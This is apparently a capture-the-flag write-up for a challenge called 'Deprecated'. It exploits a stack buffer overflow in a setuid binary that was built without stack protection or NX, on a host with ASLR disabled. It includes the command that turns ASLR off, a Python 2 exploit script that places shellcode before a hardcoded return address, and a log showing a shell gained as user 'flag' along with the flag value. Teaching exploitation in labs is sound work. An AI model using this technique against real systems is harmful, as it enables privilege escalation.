# Deprecated

**Points: 350**

Please help us test our fantastic guest application. Located at /guest/derp
I really hope it doesn't use deprecated functions.

`ssh guest@10.20.210.10`

### Setup
If you want to test this on your own machine, ASLR (Address Space Layout Randomization) has to be disabled first:

`# echo 0 > /proc/sys/kernel/randomize_va_space`

As you can see in the Makefile, we've turned on execstack and compiled without any stack protection.

### How to pwn
This challenge is a standard (old) buffer overflow challenge. The binary has been compiled without stack protection, no NX bit, and ASLR is disabled on the system. The binary also has the setuid bit, which means that it temporarily runs with the privileges of the owner (in this case the user `flag`).

`-rwsr-sr-x 1 flag flag 6.8K useless`

The first thing we need is our shellcode, the file `shell.s` contains shellcode that will spawn a shell as the user who owns the program.

**Insert shellcode explanation here**

Exploit layout:
```
  45 bytes      27 bytes	8 bytes
+-----------+-----------------+-------+
| shellcode |   padding	      |address|
+-----------+-----------------+-------+
```

This will overwrite the saved return address and trick the program into returning to the start of the buffer, where we have placed our shellcode.

Here's a simple way to construct the exploit with python:

```python
from struct import pack

shellcode = ""

with open('shell') as sc:
    data = sc.read()
    for i in data:
        shellcode += i
    sc.close()

buf_addr = pack("<q", 0x7fffffffe7c0)

pad_len = 72 - len(shellcode)

shellcode += "A" * pad_len
shellcode += buf_addr

print shellcode
```

Let's see if it works!

```
$ ( python2 pwn.py ; cat ) | ./gets
0x7fffffffe7c0
You entered: jkXPPP_^ZjuXH1�PP^ZH��/bin/shH�WT_j;XAAAAAAAAAAAAAAAAAAAAAAAAAAA�����

whoami
flag
cat flag
e4AEQd2%nu
exit

```

### Links
[Smashing the Stack For Fun And Profit](http://insecure.org/stf/smashstack.html)
